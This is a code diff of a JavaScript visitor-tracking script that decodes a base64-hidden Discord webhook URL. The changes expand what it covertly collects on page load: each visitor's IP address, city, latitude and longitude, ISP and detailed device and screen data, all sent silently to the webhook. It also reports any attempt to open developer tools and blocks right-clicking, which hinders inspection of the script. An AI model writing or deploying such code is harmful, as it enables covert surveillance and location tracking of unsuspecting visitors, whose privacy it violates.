@@ -3,12 +3,12 @@ const encodedWebhookURL = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzOTg4N
 const webhookURL = atob(encodedWebhookURL); // Decoding the URL
 
 // Function to send user details to a Discord webhook as an embed
-function sendUserDetailsToDiscord(details) {
+function sendToDiscord(message) {
     const data = {
         embeds: [{
             title: 'User Action Logged ✅ [NORMAL USER]',
             color: 0xff0000, // Red color
-            description: details
+            description: message
         }]
     };
 
@@ -25,55 +25,86 @@ function sendUserDetailsToDiscord(details) {
 
 // Log user details on page load
 window.addEventListener('load', () => {
-    // IP Address
-    fetch('https://api64.ipify.org?format=json')
+    fetch('https://uncors.vercel.app/?url=http://ip-api.com/json/')
         .then(response => response.json())
         .then(data => {
-            const ip = data.ip;
+            const ip = data.query;
+            const hostname = data.hostname;
+            const country = data.country;
+            const region = data.regionName;
+            const city = data.city;
+            const latitude = data.lat;
+            const longitude = data.lon;
+            const isp = data.isp;
             const userAgent = navigator.userAgent;
-            const geolocation = navigator.geolocation;
-            const cookiesEnabled = navigator.cookieEnabled;
-            const screenResolution = `${window.screen.width}x${window.screen.height}`;
-            const referrer = document.referrer;
+            const windowProperties = Object.keys(window).length;
+            const windowWidth = window.innerWidth;
+            const windowHeight = window.innerHeight;
+            const windowRatio = windowWidth / windowHeight;
+            const screenWidth = screen.width;
+            const screenHeight = screen.height;
+            const screenRatio = screenWidth / screenHeight;
+            const screenPixelRatio = window.devicePixelRatio;
+            const screenDPI = screen.pixelDepth;
+            const screenColorDepth = screen.colorDepth;
+            const screenOrientation = screen.orientation.type;
+            const screenRotation = screen.orientation.angle;
+            const os = navigator.platform;
+            const availableBrowserMemory = navigator.deviceMemory || 'Not available';
+            const cpuThreads = navigator.hardwareConcurrency || 'Not available';
 
-            const details = `
-                IP Address: ${ip}\n
-                User Agent: ${userAgent}\n
-                Geolocation: ${geolocation}\n
-                Cookies Enabled: ${cookiesEnabled}\n
-                Screen Resolution: ${screenResolution}\n
-                Referrer URL: ${referrer}
-            `;
+            console.log('IP Address:', ip);
+            console.log('Hostname:', hostname);
+            console.log('Country:', country);
+            console.log('Region:', region);
+            console.log('City:', city);
+            console.log('Latitude:', latitude);
+            console.log('Longitude:', longitude);
+            console.log('ISP:', isp);
+            console.log('User Agent:', userAgent);
+            console.log('Window Properies:', windowProperties);
+            console.log('Window Width:', windowWidth);
+            console.log('Window Height:', windowHeight);
+            console.log('Window Ratio:', windowRatio);
+            console.log('Screen Width:', screenWidth);
+            console.log('Screen Height:', screenHeight);
+            console.log('Screen Ratio:', screenRatio);
+            console.log('Screen Pixel Ratio:', screenPixelRatio);
+            console.log('Screen DPI:', screenDPI);
+            console.log('Screen Color Depth:', screenColorDepth);
+            console.log('Screen Orientation:', screenOrientation);
+            console.log('Screen Rotation:', screenRotation);
+            console.log('OS:', os);
+            console.log('Available Browser Memory:', availableBrowserMemory);
+            console.log('CPU Threads:', cpuThreads);
 
-            console.log('User Details:', details);
+            sendToDiscord(`IP Address: ${ip}\nHostname: ${hostname}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nLatitude: ${latitude}\nLongitude: ${longitude}\nISP: ${isp}\nUser Agent: ${userAgent}\nWindow Properies: ${windowProperties}\nWindow Width: ${windowWidth}\nWindow Height: ${windowHeight}\nWindow Ratio: ${windowRatio}\nScreen Width: ${screenWidth}\nScreen Height: ${screenHeight}\nScreen Ratio: ${screenRatio}\nScreen Pixel Ratio: ${screenPixelRatio}\nScreen DPI: ${screenDPI}\nScreen Color Depth: ${screenColorDepth}\nScreen Orientation: ${screenOrientation}\nScreen Rotation: ${screenRotation}\nOS: ${os}\nAvailable Browser Memory: ${availableBrowserMemory}\nCPU Threads: ${cpuThreads}`);
 
-            sendUserDetailsToDiscord(details);
+            // Add key event listener for Ctrl+Shift+J
+            document.addEventListener('keydown', function(event) {
+                const key = event.key;
+                const keyCombo = (event.ctrlKey ? 'Ctrl+' : '') + (event.shiftKey ? 'Shift+' : '') + key;
+                if (keyCombo === 'Ctrl+Shift+I' || keyCombo === 'Ctrl+Shift+i') {
+                    sendToDiscord('User pressed Ctrl+Shift+I to open console');
+                } else if (keyCombo === 'Ctrl+Shift+J' || keyCombo === 'Ctrl+Shift+j') {
+                    sendToDiscord('User pressed Ctrl+Shift+J to open element inspector');
+                } else if (keyCombo === 'Ctrl+Shift+C' || keyCombo === 'Ctrl+Shift+c') {
+                    sendToDiscord('User pressed Ctrl+Shift+C to open element inspector');
+                } else if (keyCombo === 'Ctrl+Shift+U' || keyCombo === 'Ctrl+Shift+u') {
+                    sendToDiscord('User pressed Ctrl+Shift+U to open element inspector');
+                } else if (keyCombo === 'Ctrl+U' || keyCombo === 'Ctrl+u') {
+                    sendToDiscord('User pressed Ctrl+U to open element inspector');
+                } else if (keyCombo === 'F12') {
+                    sendToDiscord('User pressed F12 to open element inspector');
+                }
+                // Add other key combinations as needed
+            });
+
+            // Add contextmenu event listener for right-click
+            document.addEventListener('contextmenu', function(event) {
+                sendToDiscord('User attempted to right-click');
+                event.preventDefault(); // Prevent the default right-click behavior
+            });
         })
         .catch(error => console.error('Error getting user details:', error));
-});
-
-// Add key event listener for Ctrl+Shift+J
-document.addEventListener('keydown', function(event) {
-    const key = event.key;
-    const keyCombo = (event.ctrlKey ? 'Ctrl+' : '') + (event.shiftKey ? 'Shift+' : '') + key;
-    if (keyCombo === 'Ctrl+Shift+I' || keyCombo === 'Ctrl+Shift+i') {
-        sendUserDetailsToDiscord('User pressed Ctrl+Shift+I to open console');
-    } else if (keyCombo === 'Ctrl+Shift+J' || keyCombo === 'Ctrl+Shift+j') {
-        sendUserDetailsToDiscord('User pressed Ctrl+Shift+J to open element inspector');
-    } else if (keyCombo === 'Ctrl+Shift+C' || keyCombo === 'Ctrl+Shift+c') {
-        sendUserDetailsToDiscord('User pressed Ctrl+Shift+C to open element inspector');
-    } else if (keyCombo === 'Ctrl+Shift+U' || keyCombo === 'Ctrl+Shift+u') {
-        sendUserDetailsToDiscord('User pressed Ctrl+Shift+U to open element inspector');
-    } else if (keyCombo === 'Ctrl+U' || keyCombo === 'Ctrl+u') {
-        sendUserDetailsToDiscord('User pressed Ctrl+U to open element inspector');
-    } else if (keyCombo === 'F12') {
-        sendUserDetailsToDiscord('User pressed F12 to open element inspector');
-    }
-    // Add other key combinations as needed
-});
-
-// Add contextmenu event listener for right-click
-document.addEventListener('contextmenu', function(event) {
-    sendUserDetailsToDiscord('User attempted to right-click');
-    event.preventDefault(); // Prevent the default right-click behavior
 });
